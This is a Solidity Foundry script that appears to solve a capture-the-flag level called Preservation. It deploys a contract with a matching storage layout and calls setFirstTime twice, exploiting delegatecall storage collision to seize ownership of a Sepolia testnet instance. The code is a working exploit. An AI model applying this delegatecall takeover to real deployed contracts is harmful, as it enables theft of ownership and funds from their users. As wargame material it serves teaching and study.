// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level16Preservation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: The goal of this level is for you to claim ownership of the instance you are given.

contract Player {
    // This contract will be used to claim ownership of the Preservation contract
    // by exploiting the delegatecall mechanism.
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        // This function will be called by the Preservation contract
        // to set the owner to this contract's address.
        owner = msg.sender;
    }
}

contract Level16Solution is Script {
    Preservation public preservation =
        Preservation(0x7F9B873F1F491D84cCD6c5bbdB16C82Dc86B580E);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("old owner:", preservation.owner());

        Player player = new Player();
        // Set the timeZone1Library to the Player contract address
        // This is possible because delegatecall will set the value in the fisrst storage slot
        // of the Preservation contract. So, we can set the first storage slot to the address of the Player contract.
        preservation.setFirstTime(uint256(uint160(address(player))));
        // Now, during the second calling of `setFirstTime`, the Preservation contract will delegatecall to the Player contract
        // which was set during the first calling `setFirstTime`, which will set the new owner address.
        preservation.setFirstTime(1);

        console.log("new owner:", preservation.owner());

        vm.stopBroadcast();
    }
}

// forge script script/Level16Solution.s.sol:Level16Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
